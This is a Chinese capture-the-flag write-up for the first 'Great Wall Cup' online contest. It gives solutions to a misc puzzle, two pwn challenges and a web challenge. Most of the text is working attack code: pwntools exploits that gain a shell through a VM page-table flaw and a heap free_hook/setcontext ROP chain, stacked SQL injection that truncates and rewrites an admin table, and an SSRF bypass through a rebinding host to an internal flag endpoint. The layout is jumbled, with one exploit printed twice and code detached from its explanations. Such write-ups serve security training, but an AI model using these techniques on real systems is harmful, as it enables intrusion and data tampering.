# 【WP】第一届“长城杯”网络安全大赛线上赛

> 原文: https://www.ctfiot.com/19019.html
> ID: 19019

9月19日，由春秋GAME伽玛实验室支持的第一届“长城杯”网络安全大赛线上赛圆满结束。伽玛实验室精选了4道赛题的解题思路一起学习 ~

Misc:你这flag保熟吗

将1.png和2.png拖到010editor查看，发现rar的文件头，另存为rar文件，解压后得到password.xls和hint.txt

Pwn:easy_vm

漏洞分析：

VM申请内存时，最大可以申请0x300000大小的内存，当使用malloc申请内存超过 0x200000的时候就会调用mmap函数从mmap区申请内存，且这个地址和libc和ld的偏移是固定的。

在VM中可以下断点，一个“INFO”类型的断点可以将，申请的内存地址打印出来，这就相当于是泄露了libc和ld的基址。

利用这个泄露的ld基址可以找到位于linkmap中的一个text段基址。

在检查页表项的基址是否在合法范围内时对于64位的页表项只检查了低16位,这就导致页表项的页框基址可以很大或者很小。

而在寻址时是通过页框基址 + 24位偏移，来进行寻址的也就是配合LW和SW的指令可以获得任意地址读写的功能。

漏洞利用：

先泄露ld的基址。然后在PAGE指令初始化页表的时候利用页表的漏洞将ld基址填入页表中，利用这个页表项通过LW和SW将text段基址放入寄存器中。利用泄露的libc基址计算出one_gadget地址。使用LD_PAGE指令将寄存器中的text段基址放入页表中。再利用text段的页表项将puts的got改成onegadget执行到EXIT指令调用puts拿到shell。

#coding=utf-8
from pwn import *
local = 0#这里设置是本地还是远程
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a = process(exec_file)
    elf = ELF(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("./libc.so.6",checksec = False) 
else:
    a=remote()
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'n'+"set $libc_base="+str(libc_base)+'n'
    script+='''
    b *$rebase(0x00000000501F)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def page():
    payload = p32(12)
    return payload
def ld_page(reg_idx, page_idx):
    opcode = 13
    tmp = opcode | (reg_idx << 6) | (page_idx << 9)
    payload = p32(tmp)
    return payload 
def creat_page(addr):
    flag = 0x3ff
    tmp = addr << 10 | flag
    payload = p64(tmp)
    return payload
def LW(dest_idx,src_idx,imm):
    opcode = 0x2
    tmp = opcode | (dest_idx << 6) | (src_idx << 9) | (imm << 12)
    payload = p32(tmp)
    return payload
def PUSH(imm):
    opcode = 10
    tmp = opcode | (imm << 6)
    payload = p32(tmp)
    return payload
def POP(idx):
    opcode = 11
    tmp = opcode | (idx << 6)
    payload = p32(tmp)
    return payload
def SAL(idx_1,idx_2,dest_idx):
    opcode = 15
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload
def OR(idx_1,idx_2,dest_idx):
    opcode = 9
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload 
def ADD(idx_1,idx_2,dest_idx):
    opcode = 3
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload 
def SW(dest_reg, src_reg, imm):
    opcode = 1
    tmp = opcode | ((imm & 0x1f) << 6) | (dest_reg << 11) | (src_reg << 14) | ((imm >> 5) << 17)
    payload = p32(tmp)
    return payload
def SUB(idx_1,idx_2,dest_idx):
    opcode = 4
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload 
 

relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'x00'    #stdout-0x33
#debug()
a.sendlineafter("size: ",str(0x400))
puts_got = elf.got["puts"]
malloc_got = elf.got["malloc"]
one_gadget = 0xf1247
code = page()#初始化页表

code += PUSH(2) + POP(0) + LW(1,0,0) #text_base is in  1 reg
code += PUSH(10) + POP(0) + SAL(1,0,1)
code += PUSH(0x3ff) + POP(0) + OR(1,0,1)#将地址格式修改成符合页表项的格式

code += ld_page(1,3)#将text段基址存入页表中
code += PUSH(3) + POP(4) + LW(0,4,malloc_got)#4号寄存器中存的是,text基址所在的页号
code += PUSH(libc.sym["malloc"]) + POP(2) + SUB(0,2,0)
code += PUSH(one_gadget) + POP(3)
code += ADD(0,3,3)
code += PUSH(3) + POP(4) + SW(4,3,puts_got)

a.sendlineafter("> ",code)
a.sendlineafter("size: ",str(0x200001))
a.sendlineafter("bp? > ",'y')
a.sendlineafter("num : ",str(1))
a.sendlineafter("Type : ","INFO")
a.sendlineafter("addr : ",str(0))
a.recvuntil("Your mem_addr = 0x")
libc_base = int(a.recv(12),16) + 0x509ff0#0x353ff0 - 0x4000 + 0x1ba000
ld_base = libc_base + 0x962000
text_linkmap_addr = ld_base + 0x227168#泄露ld地址和linkmap地址
fuck(libc_base)
fuck(ld_base)
fuck(text_linkmap_addr)

page_payload = creat_page(libc_base)
page_payload += creat_page(ld_base)
page_payload += creat_page(text_linkmap_addr)#用泄露的linkmap地址初始化页表项就可以从linkmap中读取text段基址
a.sendafter("> ",page_payload)

a.interactive()

Pwn:K1ng_in_h3Ap_II

1. 检查题目保护：

Web:p&p

首先进行sql注入。


```
xxd -r hint.txt 

password被base64编码了25次，编码后的前16个字符为Vm0wd2QyUXlVWGxW
```



```
import xlrd
import base64

wb = xlrd.open_workbook("password.xls")
sh = wb.sheet_by_name('sheet')

# 生成希尔伯特曲线的坐标  order为阶数
row = sh.nrows
order = 0
while row >= 2:
    row = row/2
    order += 1
phc = [[[0,0]]]
for o in range(order):
    new_phc = []
    new_phc += [[y, x] for x, y in phc[o]]
    new_phc += [[x, y + 2**o] for x, y in phc[o]]
    new_phc += [[x + 2**o, y + 2**o] for x, y in phc[o]]
    new_phc += [[2**o - 1 - y + 2**o, 2**o - 1 - x] for x, y in phc[o]]
    phc.append(new_phc)
final_phc = phc[-1]
print('成功生成%s阶伪希尔伯特曲线' % order)

password = ''
for coordinate in final_phc:
    row = coordinate[1]
    col = coordinate[0]
    password += sh.cell_value(row, col)
print('成功读取excel')

for i in range(25):
    password = base64.b64decode(password.encode('utf-8')).decode('utf-8')
print(password)
```



```
1f_y0u_h4ve_7he_fllllllag,_I_muSt_vvant_1t!
```



```
error
```



```
flag = [117, 111, 122, 116, 123, 83, 114, 82, 121, 118, 105, 103, 95, 88, 102, 105, 101, 118, 98, 49, 72, 95, 52, 95, 101, 101, 48, 109, 119, 118, 105, 117, 102, 33, 95, 120, 102, 105, 101, 118, 125, 101, 114, 114, 111, 114]
for num in flag:
    print(chr(num), end='')
```



```
uozt{SrRyvig_Xfievb1H_4_ee0mwviuf!_xfiev}error
```



```
import string

flag = 'uozt{SrRyvig_Xfievb1H_4_ee0mwviuf!_xfiev}'

# 替换指定位置的字符
def myreplace(old_s, char, index):
    new_s = old_s[:index] + char + old_s[index+1:]
    return new_s

# 埃特巴什码  解密
lowercase = string.ascii_lowercase
uppercase = string.ascii_uppercase
for i in range(len(flag)):
    if flag[i] in lowercase:
        char = lowercase[25 - lowercase.find(flag[i])]
        flag = myreplace(flag, char, i)
    elif flag[i] in uppercase:
        char = uppercase[25 - uppercase.find(flag[i])]
        flag = myreplace(flag, char, i)
    else:
        pass
print(flag)
```



```
#coding=utf-8
from pwn import *
local = 0#这里设置是本地还是远程
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=[]
if local :
    a = process(exec_file)
    elf = ELF(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("./libc.so.6",checksec = False) 
else:
    a=remote()
    libc=ELF("./libc.so.6")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'n'+"set $libc_base="+str(libc_base)+'n'
    script+='''
    b *$rebase(0x00000000501F)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def page():
    payload = p32(12)
    return payload
def ld_page(reg_idx, page_idx):
    opcode = 13
    tmp = opcode | (reg_idx << 6) | (page_idx << 9)
    payload = p32(tmp)
    return payload 
def creat_page(addr):
    flag = 0x3ff
    tmp = addr << 10 | flag
    payload = p64(tmp)
    return payload
def LW(dest_idx,src_idx,imm):
    opcode = 0x2
    tmp = opcode | (dest_idx << 6) | (src_idx << 9) | (imm << 12)
    payload = p32(tmp)
    return payload
def PUSH(imm):
    opcode = 10
    tmp = opcode | (imm << 6)
    payload = p32(tmp)
    return payload
def POP(idx):
    opcode = 11
    tmp = opcode | (idx << 6)
    payload = p32(tmp)
    return payload
def SAL(idx_1,idx_2,dest_idx):
    opcode = 15
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload
def OR(idx_1,idx_2,dest_idx):
    opcode = 9
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload 
def ADD(idx_1,idx_2,dest_idx):
    opcode = 3
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload 
def SW(dest_reg, src_reg, imm):
    opcode = 1
    tmp = opcode | ((imm & 0x1f) << 6) | (dest_reg << 11) | (src_reg << 14) | ((imm >> 5) << 17)
    payload = p32(tmp)
    return payload
def SUB(idx_1,idx_2,dest_idx):
    opcode = 4
    tmp = opcode | (dest_idx << 6) | (idx_1 << 9) | (idx_2 << 12)
    payload = p32(tmp)
    return payload 
 

relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'x00'    #stdout-0x33
#debug()
a.sendlineafter("size: ",str(0x400))
puts_got = elf.got["puts"]
malloc_got = elf.got["malloc"]
one_gadget = 0xf1247
code = page()#初始化页表

code += PUSH(2) + POP(0) + LW(1,0,0) #text_base is in  1 reg
code += PUSH(10) + POP(0) + SAL(1,0,1)
code += PUSH(0x3ff) + POP(0) + OR(1,0,1)#将地址格式修改成符合页表项的格式

code += ld_page(1,3)#将text段基址存入页表中
code += PUSH(3) + POP(4) + LW(0,4,malloc_got)#4号寄存器中存的是,text基址所在的页号
code += PUSH(libc.sym["malloc"]) + POP(2) + SUB(0,2,0)
code += PUSH(one_gadget) + POP(3)
code += ADD(0,3,3)
code += PUSH(3) + POP(4) + SW(4,3,puts_got)

a.sendlineafter("> ",code)
a.sendlineafter("size: ",str(0x200001))
a.sendlineafter("bp? > ",'y')
a.sendlineafter("num : ",str(1))
a.sendlineafter("Type : ","INFO")
a.sendlineafter("addr : ",str(0))
a.recvuntil("Your mem_addr = 0x")
libc_base = int(a.recv(12),16) + 0x509ff0#0x353ff0 - 0x4000 + 0x1ba000
ld_base = libc_base + 0x962000
text_linkmap_addr = ld_base + 0x227168#泄露ld地址和linkmap地址
fuck(libc_base)
fuck(ld_base)
fuck(text_linkmap_addr)

page_payload = creat_page(libc_base)
page_payload += creat_page(ld_base)
page_payload += creat_page(text_linkmap_addr)#用泄露的linkmap地址初始化页表项就可以从linkmap中读取text段基址
a.sendafter("> ",page_payload)

a.interactive()
```



```
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

#p = process("./pwn")
p = remote("")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(index,size):
    p.sendlineafter(">> n",str(1))
    p.sendlineafter("index:n",str(index))
    p.sendlineafter("size:n",str(size))
def delete(index):
    p.sendlineafter(">> n",str(2))
    p.sendlineafter("index:n",str(index))
def edit(index,context):
    p.sendlineafter(">> n",str(3))
    p.sendlineafter("index:n",str(index))
    p.sendafter("context:n",context)

def show(index):
    p.sendlineafter(">> n",str(4))
    p.sendlineafter("index:n",str(index))

for i in range(9):
    add(i,0x58)
for i in range(8):
    delete(i)

p.sendlineafter(">> n",'0'*0x2000+"9")
show(7)
main_arean_xx = u64(p.recv(6).ljust(8,'x00'))-176
print "main_arean_xx:",hex(main_arean_xx)
libc_base = main_arean_xx - (0x7ffff7dcdc40-0x7ffff79e2000)
print "libc_base:",hex(libc_base)
free_hook = libc_base + libc.symbols['__free_hook']
print "free_hook:",hex(free_hook)
setcontext_53 = libc_base + libc.symbols['setcontext']+53
print "setcontext:",hex(setcontext_53)
show(1)
heap_base = u64(p.recv(6).ljust(8,'x00'))-(0x555555757f30-0x555555757000)
print "heap_base:",hex(heap_base)

edit(6,p64(free_hook))
add(10,0x58)
edit(10,'./flagx00')
add(11,0x58)
edit(11,p64(setcontext_53))

pop_rdi_ret = libc_base + 0x00000000000215bf
pop_rsi_ret = libc_base + 0x0000000000023eea
pop_rdx_rsi_ret = libc_base + 0x0000000000130569
ret = libc_base + 0x00000000000008aa

payload0  = 'b'*0x10
payload0 += "./flagx00".ljust(0x30,'x00') 
payload0 += p64(0xff0 + heap_base) 
payload0 += p64(ret)
edit(1,payload0)

# gdb.attach(p,"b *0x7ffff782dd15")
# raw_input()

payload1 = p64(pop_rdi_ret) + p64(0)
payload1 += p64(pop_rdx_rsi_ret) + p64(0x1000) + p64(heap_base + 0x1020)
payload1 += p64(libc_base+libc.symbols['read'])
edit(2,payload1)

delete(0)

payload2  = p64(pop_rdi_ret) + p64(heap_base+0xfa0)
payload2 += p64(pop_rsi_ret) + p64(0x0)
payload2 += p64(libc_base+libc.symbols['open'])
payload2 += p64(pop_rdi_ret) + p64(3)
payload2 += p64(pop_rdx_rsi_ret) + p64(0x100) + p64(heap_base+0x440)
payload2 += p64(libc_base+libc.symbols['read'])
payload2 += p64(pop_rdi_ret) + p64(1)
payload2 += p64(pop_rdx_rsi_ret) + p64(0x100) + p64(heap_base+0x400)
payload2 += p64(libc_base+libc.symbols['write'])
p.send(payload2)

p.interactive()
```



```
username=fake_admin&password=';show tables;&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
//array(1) {
  [0]=>
  string(10) "fake_admin"
}

array(1) {
  [0]=>
  string(27) "real_admin_here_do_you_find"
}
```



```
username=fake_admin&password=';show create table real_admin_here_do_you_find;&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
//array(2) {
  [0]=>
  string(27) "real_admin_here_do_you_find"
  [1]=>
  string(241) "CREATE TABLE `real_admin_here_do_you_find` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `yourname` varchar(32) DEFAULT NULL,
  `password` varchar(32) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4"
}
```



```
username=fake_admin&password=';truncate table real_admin_here_do_you_find;&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```



```
username=fake_admin&password=';replace real_admin_here_do_you_find value('1','admin_inner','admin');&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```



```
<?php 
session_start();
error_reporting(0);
if($_SESSION['username']!='admin_inner'){
 die("Only admin_inner");
}else if(isset($_GET['action'])){
 $action = $_GET['action'];
}else{
 show_source(__FILE__);
}

function curlNet($route,$payload=null){
 $url = 'http://127.0.0.1:18888/'.$route;
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
 if($payload!==null){
  curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
 }
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $result = curl_exec($ch);
 curl_close($ch); 
 return(@$result?$result:'false');
}

function curlNetAll($url,$payload=null){
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_HTTPHEADER);
 if($payload!==null){
  curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
 }
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $result = curl_exec($ch);
 curl_close($ch); 
 return(@$result?$result:'false');
}

switch ($action) 
{
 case "index":
  $content = curlNet("index");
  echo $content;
  break;
 case "download":
  header('Content-Type: text/plain');
  header('Content-Disposition: attachment; filename="../internal.py');
  $handle = fopen("../internal.py", 'rb');
  while (!feof($handle) ) { 
   echo fread($handle, "1024");
  }
  fclose($handle);
  break;
 case "secrets":
  $data = file_get_contents("php://input");
  $data = json_decode($data,true);
  if(!is_array($data)) die("don't try.");
  $content = curlNet("secrets",json_encode(array($data)));
  $res = @$content?$content:'false';
  echo($res);
  break;
 case "curl":
  $secrets = file_get_contents("/85ae29dcb6794b9747c04d09948f6480.txt");
  $data = file_get_contents("php://input");
  $data = json_decode($data,true);
  if(!is_array($data)) die("don't try.");
  if($secrets!==$data["secrets"]) die("get the secrets first");
  $url = $data["url"];
  $res = parse_url($url);
  $ip = dns_get_record($res['host'], DNS_A)[0]['ip'];
  if(stripos($ip,"127")||stripos($ip,"0.0.0")||stripos($ip,"@")||stripos($ip,"0x")) die("no!");
  echo curlNetAll($url);
  break;
 default:
  die("no others");
  break;

}
?>
```



```
/adminsapi.php?action=download
```



```
from flask import Flask,request
import json

app = Flask(__name__)

@app.route('/')
@app.route('/index')
def home():
    return "admin's api"

@app.route('/secrets', methods=['GET', 'POST'])
def secrets():
    if request.method == 'POST':
        myJson = json.loads(request.data)[0]
        if(myJson['secrets'] in open('/85ae29dcb6794b9747c04d09948f6480.txt').read().split('n')):
            return json.dumps(True)
        else:
            return json.dumps(False)
    else:
        return "nothing"

@app.errorhandler(500)
def internal_error(error):
 return str(open('/85ae29dcb6794b9747c04d09948f6480.txt').read().split('n'))

@app.route('/flag', methods=['GET', 'POST'])
def flag():
    return str(open('/flag').read().split('n'))

app.run(host='127.0.0.1', port=18888)
```



```
{"secrets":3.3e99999999999999}
```



```
url:
/adminsapi.php?action=curl

json:
{"url":"http://r.xxxxx.ceye.io:18888/flag","secrets":"00b252ba3f52a539ef90e7254f2d9874"}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/10-1640490906.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/10-1640490907.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/9-1640490907.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/1-1640490907.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/3-1640490907.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/6-1640490908.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/5-1640490908.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/6-1640490908-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/2-1640490909.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/6-1640490909.png)